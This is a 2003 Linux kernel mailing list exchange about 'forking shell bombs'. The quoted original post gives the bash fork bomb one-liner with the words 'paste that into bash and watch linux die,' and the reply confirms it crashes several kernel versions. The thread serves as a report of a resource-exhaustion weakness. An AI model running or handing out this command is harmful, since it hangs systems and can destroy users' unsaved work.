Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S265326AbTGHUZN (ORCPT <rfc822;willy@w.ods.org>);
	Tue, 8 Jul 2003 16:25:13 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S265332AbTGHUZM
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 8 Jul 2003 16:25:12 -0400
Received: from sccrmhc13.comcast.net ([204.127.202.64]:57579 "EHLO
	sccrmhc13.comcast.net") by vger.kernel.org with ESMTP
	id S265326AbTGHUZH (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Tue, 8 Jul 2003 16:25:07 -0400
Reply-To: <vlad@lrsehosting.com>
From: <vlad@lrsehosting.com>
To: "'Ryan Underwood'" <nemesis-lists@icequake.net>,
       "Lkml \(E-mail\)" <linux-kernel@vger.kernel.org>
Subject: RE: Forking shell bombs
Date: Tue, 8 Jul 2003 15:35:26 -0500
Message-ID: <000901c34590$778e0870$0200a8c0@wsl3>
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3 (Normal)
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook CWS, Build 9.0.6604 (9.0.2911.0)
In-Reply-To: <20030708184537.GJ1030@dbz.icequake.net>
Importance: Normal
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1165
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Interesting!  Kills a Slackware 9.0 stock system nicely, kills the same
system nicely with 2.5.74 config'd with make oldconfig answering no to all
questions.

--

 /"\                         / For information and quotes, email us at
 \ /  ASCII RIBBON CAMPAIGN / info@lrsehosting.com
  X   AGAINST HTML MAIL    / http://www.lrsehosting.com/
 / \  AND POSTINGS        / vlad@lrsehosting.com
-------------------------------------------------------------------------

-----Original Message-----
From: linux-kernel-owner@vger.kernel.org
[mailto:linux-kernel-owner@vger.kernel.org]On Behalf Of Ryan Underwood
Sent: Tuesday, July 08, 2003 1:46 PM
To: linux-kernel@vger.kernel.org
Cc: witwerg@icequake.net
Subject: Forking shell bombs



Hi,

:(){ :|:&};:

Paste that into bash and watch linux die. (2.4.21 stock)


